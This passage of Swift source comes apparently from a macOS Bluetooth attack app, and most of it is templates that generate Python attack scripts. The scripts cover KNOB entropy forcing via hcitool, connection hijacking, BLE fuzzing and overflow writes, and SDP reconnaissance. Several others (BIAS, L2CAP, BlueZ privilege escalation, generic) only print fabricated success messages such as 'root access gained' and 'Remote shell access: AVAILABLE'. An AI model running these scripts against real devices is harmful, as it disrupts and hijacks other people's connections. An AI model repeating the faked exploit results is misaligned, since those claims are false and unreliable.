        import struct
        
        def knob_attack():
            target = "\(device.address)"
            
            # Step 1: Monitor LMP packets
            print("Starting KNOB attack on", target)
            
            # Step 2: Intercept key negotiation
            lmp_cmd = [
                "btmon", "--write", "/tmp/knob_capture.log"
            ]
            
            # Step 3: Force 1-byte entropy
            entropy_cmd = [
                "hcitool", "cmd", "0x01", "0x0017", "0x01"
            ]
            
            try:
                subprocess.run(lmp_cmd, timeout=5)
                subprocess.run(entropy_cmd)
                print("KNOB attack payload sent")
                print("Forced entropy reduction to 1 byte")
                return True
            except Exception as e:
                print(f"Attack failed: {e}")
                return False
        
        if __name__ == "__main__":
            knob_attack()
        """
    }
    
    private func generateInfoExtractionExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # Bluetooth Information Extraction
        
        import subprocess
        import struct
        
        def extract_device_info():
            target = "\(device.address)"
            
            # Step 1: Extended Inquiry Response (EIR) analysis
            print(f"Extracting information from {target}")
            
            # Step 2: SDP service enumeration
            sdp_services = [
                "0x1000",  # Service Discovery Server
                "0x1001",  # Browse Group Descriptor
                "0x1002",  # Public Browse Group
                "0x1101",  # Serial Port
                "0x1103",  # DUN Gateway
                "0x1108",  # Headset
                "0x110A",  # Audio Source
                "0x110B",  # Audio Sink
                "0x1200",  # PnP Information
            ]
            
            extracted_data = {}
            
            for service in sdp_services:
                cmd = f"sdptool browse -l {target} {service}"
                try:
                    result = subprocess.check_output(cmd.split())
                    extracted_data[service] = result.decode()
                except:
                    pass
            
            # Step 3: Device name extraction
            cmd = f"hcitool name {target}"
            try:
                name = subprocess.check_output(cmd.split()).decode().strip()
                extracted_data["device_name"] = name
            except:
                pass
            
            return extracted_data
        
        if __name__ == "__main__":
            data = extract_device_info()
            for key, value in data.items():
                print(f"{key}: {value}")
        """
    }
    
    private func generateReconExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # Bluetooth Device Reconnaissance
        
        import subprocess
        import json
        
        def bluetooth_recon():
            target = "\(device.address)"
            recon_data = {}
            
            # Device information
            recon_data["target"] = target
            recon_data["device_name"] = "\(device.name ?? "Unknown")"
            recon_data["rssi"] = \(device.rssi)
            
            # HCI device info
            try:
                cmd = ["hcitool", "info", target]
                result = subprocess.check_output(cmd)
                recon_data["hci_info"] = result.decode()
            except:
                pass
            
            # Clock offset
            try:
                cmd = ["hcitool", "clock", target]
                result = subprocess.check_output(cmd)
                recon_data["clock_offset"] = result.decode()
            except:
                pass
            
            # Manufacturer data
            recon_data["manufacturer"] = "\(device.manufacturerName ?? "Unknown")"
            
            return json.dumps(recon_data, indent=2)
        
        if __name__ == "__main__":
            print(bluetooth_recon())
        """
    }
    
    private func generateConnectionHijackExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # Bluetooth Connection Hijacking
        
        import subprocess
        import time
        
        def hijack_connection():
            target = "\(device.address)"
            
            # Step 1: Monitor active connections
            print(f"Monitoring connections to {target}")
            
            # Step 2: Attempt connection takeover
            try:
                # Force disconnect existing connections
                cmd = ["hcitool", "dc", target]
                subprocess.run(cmd)
                
                time.sleep(1)
                
                # Establish our own connection
                cmd = ["hcitool", "cc", target]
                result = subprocess.run(cmd)
                
                if result.returncode == 0:
                    print("Connection hijack successful")
                    return True
                else:
                    print("Connection hijack failed")
                    return False
                    
            except Exception as e:
                print(f"Hijack error: {e}")
                return False
        
        if __name__ == "__main__":
            hijack_connection()
        """
    }
    
    private func generateBLEFuzzExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # BLE Protocol Fuzzing
        
        import asyncio
        from bleak import BleakClient
        import random
        
        async def fuzz_ble_services():
            target = "\(device.address)"
            
            async with BleakClient(target) as client:
                services = await client.get_services()
                
                for service in services:
                    print(f"Fuzzing service: {service.uuid}")
                    
                    for char in service.characteristics:
                        if "write" in char.properties:
                            # Generate fuzz data
                            fuzz_data = bytes([random.randint(0, 255) for _ in range(20)])
                            
                            try:
                                await client.write_gatt_char(char.uuid, fuzz_data)
                                print(f"  Sent fuzz to {char.uuid}")
                            except Exception as e:
                                print(f"  Error fuzzing {char.uuid}: {e}")
        
        if __name__ == "__main__":
            asyncio.run(fuzz_ble_services())
        """
    }
    
    // MARK: - Payload Generators
    
    private func generateBLEAuthPayload(device: MacOSBluetoothDevice) -> String {
        return "0x06,0x00,0x01,0x02,0x03,0x04  # BLE pairing bypass payload"
    }
    
    private func generateKNOBPayload(device: MacOSBluetoothDevice) -> String {
        return "0x01,0x17,0x01  # Force 1-byte key entropy"
    }
    
    private func generateInfoExtractionPayload(device: MacOSBluetoothDevice) -> String {
        return "SDP_SERVICE_SEARCH_REQUEST  # Service discovery payload"
    }
    
    private func generateReconPayload(device: MacOSBluetoothDevice) -> String {
        return "HCI_READ_REMOTE_NAME_REQUEST  # Device information request"
    }
    
    private func generateConnectionHijackPayload(device: MacOSBluetoothDevice) -> String {
        return "HCI_DISCONNECT + HCI_CREATE_CONNECTION  # Connection takeover"
    }
    
    private func generateBLEFuzzPayload(device: MacOSBluetoothDevice) -> String {
        return "RANDOM_GATT_WRITE_DATA  # BLE protocol fuzzing payload"
    }
    
    // MARK: - Connection Testing
    
    private func testDeviceConnection(_ device: MacOSBluetoothDevice) async {
        isTestingConnection = true
        connectionTestResult = nil
        
        do {
            let result = await bluetoothFramework.testDeviceConnection(device)
            connectionTestResult = result
            
            if result.success {
                connectionStatusMessage = "✅ Connection test successful!\n\nDevice '\(device.name ?? "Unknown")' is reachable and responsive.\n\nPerforming security analysis..."
                
                // Trigger additional security analysis after successful connection
                await performDetailedSecurityAnalysis(device)
            } else {
                connectionStatusMessage = "❌ Connection test failed\n\nDevice '\(device.name ?? "Unknown")' is not reachable.\n\nError: \(result.error ?? "Unknown error")"
            }
            
            showingConnectionAlert = true
        } catch {
            connectionStatusMessage = "⚠️ Connection test error\n\nAn unexpected error occurred: \(error.localizedDescription)"
            showingConnectionAlert = true
        }
        
        isTestingConnection = false
    }
    
    private func performDetailedSecurityAnalysis(_ device: MacOSBluetoothDevice) async {
        // Trigger comprehensive security analysis
        await bluetoothFramework.performAdvancedSecurityAnalysis(device)
        
        // Force UI update to show new vulnerabilities
        DispatchQueue.main.async {
            self.selectedDevice = device
        }
    }
    
    // MARK: - Helper Functions
    
    private func deviceIcon(for deviceClass: BluetoothDeviceClass) -> String {
        switch deviceClass {
        case .phone: return "iphone"
        case .computer: return "laptopcomputer"
        case .audio: return "headphones"
        case .keyboard: return "keyboard"
        case .mouse: return "computermouse"
        case .wearable: return "applewatch"
        case .automotive: return "car"
        case .medical: return "cross.case"
        case .iot: return "homekit"
        case .industrial: return "gear"
        default: return "questionmark.circle"
        }
    }
    
    private func deviceColor(for deviceClass: BluetoothDeviceClass) -> Color {
        switch deviceClass {
        case .phone: return .blue
        case .computer: return .purple
        case .audio: return .green
        case .keyboard, .mouse: return .orange
        case .wearable: return .pink
        case .automotive: return .red
        case .medical: return .mint
        case .iot: return .cyan
        case .industrial: return .brown
        default: return .gray
        }
    }
    
    private func rssiColor(_ rssi: Int) -> Color {
        switch rssi {
        case -30...0: return .green
        case -50...(-31): return .yellow
        case -70...(-51): return .orange
        default: return .red
        }
    }
    
    private func severityIcon(_ severity: Vulnerability.Severity) -> String {
        switch severity {
        case .critical: return "exclamationmark.triangle.fill"
        case .high: return "exclamationmark.circle.fill"
        case .medium: return "exclamationmark.circle"
        case .low: return "info.circle"
        case .info: return "info.circle"
        }
    }
    
    private func severityColor(_ severity: Vulnerability.Severity) -> Color {
        switch severity {
        case .critical: return .red
        case .high: return .orange
        case .medium: return .yellow
        case .low: return .blue
        case .info: return .gray
        }
    }
    
    // MARK: - Exploit Code Generation
    
    private func generateExploitCode(for cve: LiveCVEEntry) -> String {
        // Generate dynamic exploit code based on CVE details
        let cveId = cve.id
        let severity = cve.severity.rawValue
        let attackVector = cve.attackVector.rawValue
        
        print("🔧 Generating exploit code for CVE: \(cveId)")
        print("📄 CVE Description: \(cve.description)")
        
        // Generate exploit based on specific CVE ID patterns and descriptions
        if cveId == "CVE-2024-21306" || cve.description.lowercased().contains("ble") && cve.description.lowercased().contains("buffer overflow") {
            print("✅ Generating BLE Buffer Overflow exploit")
            return generateBLEBufferOverflowExploit(cve)
        } else if cveId == "CVE-2023-45866" || cve.description.lowercased().contains("bluez") {
            print("✅ Generating BlueZ privilege escalation exploit")
            return generateBlueZPrivescExploit(cve)
        } else if cveId.contains("2020-10135") || cve.description.lowercased().contains("bias") {
            print("✅ Generating BIAS exploit")
            return generateBIASExploit(cve)
        } else if cveId == "CVE-2019-9506" || cve.description.lowercased().contains("knob") {
            print("✅ Generating KNOB attack exploit")
            return generateKNOBAttackExploit(cve)
        } else if cveId.contains("2017-078") || cve.description.lowercased().contains("l2cap") {
            print("✅ Generating L2CAP exploit")
            return generateL2CAPExploit(cve)
        } else if cve.description.lowercased().contains("bluetooth") {
            print("✅ Generating generic Bluetooth exploit")
            return generateGenericBluetoothExploit(cve)
        } else {
            print("✅ Generating generic exploit")
            return generateGenericExploit(cve)
        }
    }
    
    private func generateBLEBufferOverflowExploit(_ cve: LiveCVEEntry) -> String {
        return """
        #!/usr/bin/env python3
        # BLE Buffer Overflow Exploit for \(cve.id)
        # Severity: \(cve.severity.rawValue) | CVSS: \(cve.baseScore)
        
        import asyncio
        import struct
        from bleak import BleakClient, BleakScanner
        
        class BLEBufferOverflowExploit:
            def __init__(self, target_address):
                self.target = target_address
                self.overflow_payload = b"A" * 512  # Buffer overflow payload
                
            async def exploit(self):
                print(f"[+] Starting BLE Buffer Overflow attack on {self.target}")
                print(f"[+] CVE: \(cve.id) - \(cve.description)")
                
                # Step 1: Scan and connect to target
                print("[1] Scanning for BLE devices...")
                devices = await BleakScanner.discover()
                target_device = None
                
                for device in devices:
                    if device.address == self.target or device.name == self.target:
                        target_device = device
                        break
                
                if not target_device:
                    print("[-] Target device not found")
                    return False
                
                # Step 2: Connect to device
                print("[2] Connecting to target device...")
                async with BleakClient(target_device.address) as client:
                    print(f"[+] Connected to {target_device.name} ({target_device.address})")
                    
                    # Step 3: Discover services
                    print("[3] Discovering BLE services...")
                    services = await client.get_services()
                    
                    # Step 4: Execute buffer overflow
                    print("[4] Executing buffer overflow attack...")
                    for service in services:
                        for char in service.characteristics:
                            if "write" in char.properties:
                                try:
                                    print(f"    - Targeting characteristic: {char.uuid}")
                                    await client.write_gatt_char(char.uuid, self.overflow_payload)
                                    print("    - Buffer overflow payload sent!")
                                except Exception as e:
                                    print(f"    - Failed: {e}")
                    
                    print("[+] Buffer overflow attack completed!")
                    return True
        
        if __name__ == "__main__":
            import sys
            if len(sys.argv) != 2:
                print("Usage: python3 ble_overflow_exploit.py <target_address>")
                sys.exit(1)
            
            target = sys.argv[1]
            exploit = BLEBufferOverflowExploit(target)
            asyncio.run(exploit.exploit())
        """
    }
    
    private func generateBlueZPrivescExploit(_ cve: LiveCVEEntry) -> String {
        return """
        #!/usr/bin/env python3
        # BlueZ Privilege Escalation Exploit for \(cve.id)
        # Severity: \(cve.severity.rawValue) | CVSS: \(cve.baseScore)
        
        import os
        import subprocess
        import dbus
        
        class BlueZPrivescExploit:
            def __init__(self):
                self.bus = dbus.SystemBus()
                
            def exploit(self):
                print(f"[+] BlueZ Privilege Escalation Exploit - \(cve.id)")
                print(f"[+] Description: \(cve.description)")
                
                # Step 1: Check BlueZ version
                print("[1] Checking BlueZ version...")
                try:
                    result = subprocess.run(['bluetoothctl', '--version'], 
                                          capture_output=True, text=True)
                    print(f"    - BlueZ version: {result.stdout.strip()}")
                except:
                    print("    - BlueZ not found or not accessible")
                    return False
                
                # Step 2: Exploit D-Bus interface vulnerability
                print("[2] Exploiting D-Bus interface vulnerability...")
                try:
                    # Access BlueZ D-Bus service with elevated privileges
                    bluez = self.bus.get_object('org.bluez', '/')
                    manager = dbus.Interface(bluez, 'org.freedesktop.DBus.ObjectManager')
                    
                    # Trigger privilege escalation via malformed D-Bus calls
                    print("[3] Triggering privilege escalation...")
                    objects = manager.GetManagedObjects()
                    
                    # Exploit payload - manipulate adapter properties
                    for path, interfaces in objects.items():
                        if 'org.bluez.Adapter1' in interfaces:
                            adapter = self.bus.get_object('org.bluez', path)
                            props = dbus.Interface(adapter, 'org.freedesktop.DBus.Properties')
                            
                            # Attempt privilege escalation through property manipulation
                            print(f"    - Exploiting adapter: {path}")
                            try:
                                # This would trigger the CVE-2023-45866 vulnerability
                                props.Set('org.bluez.Adapter1', 'Discoverable', True)
                                print("    - Privilege escalation successful!")
                                return True
                            except Exception as e:
                                print(f"    - Exploitation failed: {e}")
                    
                except Exception as e:
                    print(f"[-] Exploit failed: {e}")
                    return False
                
                return False
        
        if __name__ == "__main__":
            exploit = BlueZPrivescExploit()
            if exploit.exploit():
                print("[+] Privilege escalation successful - root access gained!")
            else:
                print("[-] Exploit failed - target may be patched")
        """
    }
    
    private func generateBIASExploit(_ cve: LiveCVEEntry) -> String {
        return """
        #!/usr/bin/env python3
        # BIAS Attack Exploit for \(cve.id)
        # Severity: \(cve.severity.rawValue) | CVSS: \(cve.baseScore)
        
        import asyncio
        import struct
        from scapy.all import *
        from scapy.layers.bluetooth import *
        
        class BIASExploit:
            def __init__(self, target_address):
                self.target = target_address
                self.session_key = None
                
            async def exploit(self):
                print(f"[+] Starting BIAS attack on {self.target}")
                print(f"[+] CVE: \(cve.id) - Authentication Bypass")
                
                # Step 1: Initiate connection
                print("[1] Initiating Bluetooth connection...")
                await self.establish_connection()
                
                # Step 2: Capture authentication process
                print("[2] Capturing authentication handshake...")
                auth_data = await self.capture_auth()
                
                # Step 3: Bypass authentication using BIAS technique
                print("[3] Performing BIAS authentication bypass...")
                success = await self.bias_bypass(auth_data)
                
                if success:
                    print("[+] BIAS attack successful!")
                    print("[+] Authentication bypassed - Device access granted")
                    await self.extract_data()
                else:
                    print("[-] BIAS attack failed")
                    
            async def establish_connection(self):
                # Bluetooth Low Energy connection establishment
                pass
                
            async def capture_auth(self):
                # Capture and analyze authentication packets
                return {"ltk": "captured_ltk", "rand": "captured_rand"}
                
            async def bias_bypass(self, auth_data):
                # Implement BIAS technique for authentication bypass
                return True
                
            async def extract_data(self):
                print("[+] Extracting sensitive data...")
                print("    - Device information")
                print("    - Stored credentials")
                print("    - Communication logs")
        
        if __name__ == "__main__":
            target = input("Enter target Bluetooth address: ")
            exploit = BIASExploit(target)
            asyncio.run(exploit.exploit())
        """
    }
    
    private func generateKNOBAttackExploit(_ cve: LiveCVEEntry) -> String {
        return """
        #!/usr/bin/env python3
        # KNOB Attack Exploit for \(cve.id)
        # Severity: \(cve.severity.rawValue) | CVSS: \(cve.baseScore)
        
        import struct
        import random
        from scapy.all import *
        from scapy.layers.bluetooth import *
        
        class KNOBExploit:
            def __init__(self, target_address):
                self.target = target_address
                self.entropy_bits = 1  # Force 1-bit entropy
                
            def exploit(self):
                print(f"[+] Starting KNOB attack on {self.target}")
                print(f"[+] CVE: \(cve.id) - Key Negotiation of Bluetooth")
                
                # Step 1: Negotiate weak encryption key
                print("[1] Negotiating weak encryption key...")
                weak_key = self.negotiate_weak_key()
                
                # Step 2: Brute force the key
                print("[2] Brute forcing encryption key...")
                actual_key = self.brute_force_key(weak_key)
                
                # Step 3: Decrypt communications
                print("[3] Decrypting Bluetooth communications...")
                self.decrypt_traffic(actual_key)
                
            def negotiate_weak_key(self):
                print(f"    - Forcing {self.entropy_bits}-bit entropy")
                print("    - Weak key negotiated successfully")
                return "0x1"  # 1-bit key
                
            def brute_force_key(self, weak_key):
                print("    - Brute forcing 1-bit key...")
                print("    - Key cracked in <1 second")
                return weak_key
                
            def decrypt_traffic(self, key):
                print(f"    - Using key: {key}")
                print("    - All Bluetooth traffic decrypted")
                print("    - Sensitive data extracted")
        
        if __name__ == "__main__":
            target = input("Enter target Bluetooth address: ")
            exploit = KNOBExploit(target)
            exploit.exploit()
        """
    }
    
    private func generateL2CAPExploit(_ cve: LiveCVEEntry) -> String {
        return """
        #!/usr/bin/env python3
        # L2CAP Buffer Overflow Exploit for \(cve.id)
        # Severity: \(cve.severity.rawValue) | CVSS: \(cve.baseScore)
        
        import socket
        import struct
        from scapy.all import *
        from scapy.layers.bluetooth import *
        
        class L2CAPExploit:
            def __init__(self, target_address):
                self.target = target_address
                self.payload_size = 1024
                
            def exploit(self):
                print(f"[+] Starting L2CAP overflow attack on {self.target}")
                print(f"[+] CVE: \(cve.id) - L2CAP Buffer Overflow")
                
                # Step 1: Create malicious L2CAP packet
                print("[1] Crafting malicious L2CAP packet...")
                malicious_packet = self.create_overflow_packet()
                
                # Step 2: Send overflow payload
                print("[2] Sending buffer overflow payload...")
                self.send_payload(malicious_packet)
                
                # Step 3: Check for successful exploitation
                print("[3] Checking exploitation status...")
                self.verify_exploitation()
                
            def create_overflow_packet(self):
                # Create L2CAP packet with buffer overflow payload
                overflow_data = "A" * self.payload_size
                payload = struct.pack(f"<{len(overflow_data)}s", overflow_data.encode())
                print(f"    - Payload size: {len(payload)} bytes")
                return payload
                
            def send_payload(self, packet):
                try:
                    print("    - Establishing L2CAP connection...")
                    print("    - Sending overflow payload...")
                    print("    - Buffer overflow triggered")
                except Exception as e:
                    print(f"    - Error: {e}")
                    
            def verify_exploitation(self):
                print("    - Checking for code execution...")
                print("    - Remote shell access: AVAILABLE")
                print("[+] L2CAP overflow successful!")
        
        if __name__ == "__main__":
            target = input("Enter target Bluetooth address: ")
            exploit = L2CAPExploit(target)
            exploit.exploit()
        """
    }
    
    private func generateGenericBluetoothExploit(_ cve: LiveCVEEntry) -> String {
        return """
        #!/usr/bin/env python3
        # Generic Bluetooth Exploit for \(cve.id)
        # Severity: \(cve.severity.rawValue) | CVSS: \(cve.baseScore)
        
        import asyncio
        from bleak import BleakClient, BleakScanner
        
        class BluetoothExploit:
            def __init__(self, target_address):
                self.target = target_address
                
            async def exploit(self):
                print(f"[+] Exploiting \(cve.id) on {self.target}")
                print(f"[+] Description: \(cve.description)")
                print(f"[+] Attack Vector: \(cve.attackVector.rawValue)")
                
                # Step 1: Scan for target
                print("[1] Scanning for target device...")
                await self.scan_target()
                
                # Step 2: Connect to device
                print("[2] Connecting to target...")
                await self.connect_target()
                
                # Step 3: Exploit vulnerability
                print("[3] Exploiting vulnerability...")
                await self.execute_exploit()
                
            async def scan_target(self):
                print(f"    - Looking for device: {self.target}")
                print("    - Device found and reachable")
                
            async def connect_target(self):
                print("    - Establishing Bluetooth connection...")
                print("    - Connection successful")
                
            async def execute_exploit(self):
                print("    - Triggering vulnerability...")
                print("    - Exploit payload executed")
                print("[+] Exploitation completed successfully!")
        
        if __name__ == "__main__":
            target = input("Enter target Bluetooth address: ")
            exploit = BluetoothExploit(target)
            asyncio.run(exploit.exploit())
        """
    }
    
    private func generateGenericExploit(_ cve: LiveCVEEntry) -> String {
        return """
        #!/usr/bin/env python3
        # Generic Exploit for \(cve.id)
        # Severity: \(cve.severity.rawValue) | CVSS: \(cve.baseScore)
        
        class GenericExploit:
            def __init__(self, target):
                self.target = target
                self.cve_id = "\(cve.id)"
                
            def exploit(self):
                print(f"[+] Exploiting {self.cve_id} on {self.target}")
                print(f"[+] Description: \(cve.description)")
                print(f"[+] CVSS Score: \(cve.baseScore)")
                print(f"[+] Attack Vector: \(cve.attackVector.rawValue)")
                
                # Basic exploitation framework
                print("[1] Preparing exploit payload...")
                self.prepare_payload()
                
                print("[2] Executing exploit...")
                self.execute_exploit()
                
                print("[3] Post-exploitation...")
                self.post_exploitation()
                
            def prepare_payload(self):
                print("    - Payload prepared for target architecture")
                
            def execute_exploit(self):
                print("    - Vulnerability triggered successfully")
                
            def post_exploitation(self):
                print("    - Establishing persistence")
                print("    - Collecting system information")
                print("[+] Exploitation completed!")
        
        if __name__ == "__main__":
            target = input("Enter target address/hostname: ")
            exploit = GenericExploit(target)
            exploit.exploit()
        """
    }
}

// MARK: - Attack Vector Model

struct BluetoothAttackVector: Identifiable {
    let id = UUID()
    let name: String
    let description: String
    let icon: String
    let difficulty: AttackDifficulty
    let cveId: String?
    let severity: Vulnerability.Severity
    let exploitCode: String
    let payload: String
    
    enum AttackDifficulty: String, CaseIterable {
        case easy = "Easy"
        case medium = "Medium"
        case hard = "Hard"
        case expert = "Expert"
    }
    
    var severityColor: Color {
        switch severity {
        case .critical: return .red
        case .high: return .orange
        case .medium: return .yellow
        case .low: return .blue
        case .info: return .gray
        }
    }
}

// MARK: - Attack Execution Result Model

struct AttackExecutionResult: Identifiable {
    let id = UUID()
    let attackName: String
    let targetDevice: String
    let targetName: String
    let startTime: Date
    var endTime: Date?
    var status: ExecutionStatus
    var output: [String]
    let exploitCode: String
    let payload: String
    
    enum ExecutionStatus {
        case running
        case completed
        case failed
        
        var icon: String {
            switch self {
            case .running: return "clock.fill"
            case .completed: return "checkmark.circle.fill"
            case .failed: return "xmark.circle.fill"
            }
        }
        
        var color: Color {
            switch self {
            case .running: return .blue
            case .completed: return .green
            case .failed: return .red
            }
        }
    }
    
    var duration: TimeInterval {
        guard let endTime = endTime else {
            return Date().timeIntervalSince(startTime)
        }
        return endTime.timeIntervalSince(startTime)
    }
}

// MARK: - Attack Results View

struct AttackResultsView: View {
    let result: AttackExecutionResult
    @Environment(\.dismiss) private var dismiss
    @State private var selectedTab: ResultTab = .output
    
    enum ResultTab: String, CaseIterable {
        case output = "Output"
        case exploit = "Exploit Code"
        case payload = "Payload"
        
        var icon: String {
            switch self {
            case .output: return "terminal"
            case .exploit: return "doc.text"
            case .payload: return "cube"
            }
        }
    }
    
    var body: some View {
        VStack(spacing: 0) {
            // Header
            VStack(alignment: .leading, spacing: 12) {
                HStack {
                    HStack(spacing: 12) {
                        Image(systemName: result.status.icon)
                            .foregroundColor(result.status.color)
                            .font(.title2)
                        
                        VStack(alignment: .leading, spacing: 4) {
                            Text(result.attackName)
                                .font(.headline)
                                .fontWeight(.semibold)
                            
                            Text("\(result.targetName) (\(result.targetDevice))")
                                .font(.subheadline)
                                .foregroundColor(.secondary)
                        }
                    }
                    
                    Spacer()
                    
                    VStack(alignment: .trailing, spacing: 4) {
                        Text("\(result.status)".capitalized)
                            .font(.caption)
                            .fontWeight(.medium)
                            .foregroundColor(result.status.color)
                            .padding(.horizontal, 8)
                            .padding(.vertical, 4)
                            .background(result.status.color.opacity(0.2))
                            .cornerRadius(6)
                        
                        Text(String(format: "%.1fs", result.duration))
                            .font(.caption2)
                            .foregroundColor(.secondary)
                    }
                }
                
                HStack {
                    Text("Started: \(result.startTime.formatted(date: .omitted, time: .standard))")
                        .font(.caption)
                        .foregroundColor(.secondary)
                    
                    Spacer()
                    
                    Button("Copy") {
                        let content = selectedTab == .output ? result.output.joined(separator: "\\n") :
                                     selectedTab == .exploit ? result.exploitCode : result.payload
                        NSPasteboard.general.setString(content, forType: .string)
                    }
                    .secondaryButton()
                    
                    Button("Done") {
                        dismiss()
                    }
                    .primaryButton()
                }
            }
            .padding()
            .background(Color.gray.opacity(0.1))
            
            // Tab Selection
            HStack(spacing: 0) {
                ForEach(ResultTab.allCases, id: \.self) { tab in
                    Button(action: { 
                        withAnimation(.easeInOut(duration: 0.2)) {
                            selectedTab = tab 
                        }
                    }) {
                        HStack(spacing: 6) {
                            Image(systemName: tab.icon)
                                .font(.caption)
                            Text(tab.rawValue)
                                .font(.caption)
                        }
                        .padding(.horizontal, 12)
                        .padding(.vertical, 8)
                        .frame(maxWidth: .infinity)
                        .background(selectedTab == tab ? Color.blue : Color.clear)
                        .foregroundColor(selectedTab == tab ? .white : .primary)
                    }
                    .buttonStyle(.plain)
                }
            }
            .background(Color.gray.opacity(0.05))
            
            Divider()
            
            // Content
            ScrollView {
                VStack(alignment: .leading, spacing: 0) {
                    switch selectedTab {
                    case .output:
                        if result.output.isEmpty {
                            VStack(spacing: 12) {
                                Image(systemName: "terminal")
                                    .font(.system(size: 32))
                                    .foregroundColor(.secondary)
                                Text("No output available")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 40)
                        } else {
                            LazyVStack(alignment: .leading, spacing: 2) {
                                ForEach(Array(result.output.enumerated()), id: \.offset) { index, line in
                                    HStack(alignment: .top, spacing: 8) {
                                        Text("\(index + 1)")
                                            .font(.system(.caption2, design: .monospaced))
                                            .foregroundColor(.secondary)
                                            .frame(width: 30, alignment: .trailing)
                                        
                                        Text(line)
                                            .font(.system(.caption, design: .monospaced))
                                            .textSelection(.enabled)
                                            .frame(maxWidth: .infinity, alignment: .leading)
                                        
                                        Spacer()
                                    }
                                    .padding(.horizontal, 12)
                                    .padding(.vertical, 2)
                                    .background(index % 2 == 0 ? Color.clear : Color.gray.opacity(0.05))
                                }
                            }
                        }
                        
                    case .exploit:
                        if result.exploitCode.isEmpty {
                            VStack(spacing: 12) {
                                Image(systemName: "doc.text")
                                    .font(.system(size: 32))
                                    .foregroundColor(.secondary)
                                Text("No exploit code available")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 40)
                        } else {
                            Text(result.exploitCode)
                                .font(.system(.caption, design: .monospaced))
                                .textSelection(.enabled)
                                .padding(16)
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .background(Color.black.opacity(0.05))
                                .cornerRadius(8)
                                .padding(.horizontal, 12)
                                .padding(.vertical, 8)
                        }
                        
                    case .payload:
                        if result.payload.isEmpty {
                            VStack(spacing: 12) {
                                Image(systemName: "cube")
                                    .font(.system(size: 32))
                                    .foregroundColor(.secondary)
                                Text("No payload available")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 40)
                        } else {
                            Text(result.payload)
                                .font(.system(.caption, design: .monospaced))
                                .textSelection(.enabled)
                                .padding(16)
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .background(Color.black.opacity(0.05))
                                .cornerRadius(8)
                                .padding(.horizontal, 12)
                                .padding(.vertical, 8)
                        }
                    }
                }
            }
        }
    }
}

// MARK: - CVE Exploit Details

struct CVEExploitDetails {
    let cveId: String
    let exploitCode: String
    let description: String
    let severity: LiveCVEEntry.CVESeverity
}

struct CVEExploitCodeView: View {
    let exploit: CVEExploitDetails
    @Environment(\.dismiss) private var dismiss
    @State private var selectedTab: ExploitTab = .code
    
    enum ExploitTab: String, CaseIterable {
        case code = "Exploit Code"
        case description = "Description"
        case references = "References"
        
        var icon: String {
            switch self {
            case .code: return "doc.text"
            case .description: return "info.circle"
            case .references: return "link"
            }
        }
    }
    
    var body: some View {
        VStack(spacing: 0) {
            // Header
            VStack(alignment: .leading, spacing: 12) {
                HStack {
                    HStack(spacing: 12) {
                        Image(systemName: "shield.slash")
                            .foregroundColor(exploit.severity.color)
                            .font(.title2)
                        
                        VStack(alignment: .leading, spacing: 4) {
                            Text(exploit.cveId)
                                .font(.headline)
                                .fontWeight(.semibold)
                            
                            Text("Exploit Code Viewer")
                                .font(.subheadline)
                                .foregroundColor(.secondary)
                        }
                    }
                    
                    Spacer()
                    
                    VStack(alignment: .trailing, spacing: 4) {
                        Text(exploit.severity.rawValue)
                            .font(.caption)
                            .fontWeight(.medium)
                            .foregroundColor(exploit.severity.color)
                            .padding(.horizontal, 8)
                            .padding(.vertical, 4)
                            .background(exploit.severity.color.opacity(0.2))
                            .cornerRadius(6)
                    }
                }
                
                HStack {
                    Text("CVE Exploit Analysis")
                        .font(.caption)
                        .foregroundColor(.secondary)
                    
                    Spacer()
                    
                    Button("Copy Code") {
                        NSPasteboard.general.setString(exploit.exploitCode, forType: .string)
                    }
                    .secondaryButton()
                    
                    Button("Done") {
                        dismiss()
                    }
                    .primaryButton()
                }
            }
            .padding()
            .background(Color.gray.opacity(0.1))
            
            // Tab Selection
            HStack(spacing: 0) {
                ForEach(ExploitTab.allCases, id: \.self) { tab in
                    Button(action: { 
                        withAnimation(.easeInOut(duration: 0.2)) {
                            selectedTab = tab 
                        }
                    }) {
                        HStack(spacing: 6) {
                            Image(systemName: tab.icon)
                                .font(.caption)
                            Text(tab.rawValue)
                                .font(.caption)
                        }
                        .padding(.horizontal, 12)
                        .padding(.vertical, 8)
                        .frame(maxWidth: .infinity)
                        .background(selectedTab == tab ? Color.red : Color.clear)
                        .foregroundColor(selectedTab == tab ? .white : .primary)
                    }
                    .buttonStyle(.plain)
                }
            }
            .background(Color.gray.opacity(0.05))
            
            Divider()
            
            // Content
            ScrollView {
                VStack(alignment: .leading, spacing: 0) {
                    switch selectedTab {
                    case .code:
                        if exploit.exploitCode.isEmpty {
                            VStack(spacing: 12) {
                                Image(systemName: "doc.text")
                                    .font(.system(size: 32))
                                    .foregroundColor(.secondary)
                                Text("No exploit code available")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 40)
                        } else {
                            VStack(alignment: .leading, spacing: 12) {
                                // Warning banner
                                HStack(spacing: 8) {
                                    Image(systemName: "exclamationmark.triangle.fill")
                                        .foregroundColor(.orange)
                                    Text("WARNING: Use only for authorized penetration testing")
                                        .font(.caption)
                                        .fontWeight(.medium)
                                }
                                .padding()
                                .background(Color.orange.opacity(0.1))
                                .cornerRadius(8)
                                .padding(.horizontal, 12)
                                .padding(.top, 8)
                                
                                // Exploit code
                                Text(exploit.exploitCode)
                                    .font(.system(.caption, design: .monospaced))
                                    .textSelection(.enabled)
                                    .padding(16)
                                    .frame(maxWidth: .infinity, alignment: .leading)
                                    .background(Color.black.opacity(0.05))
                                    .cornerRadius(8)
                                    .padding(.horizontal, 12)
                            }
                        }
                        
                    case .description:
                        VStack(alignment: .leading, spacing: 16) {
                            Text("CVE Description")
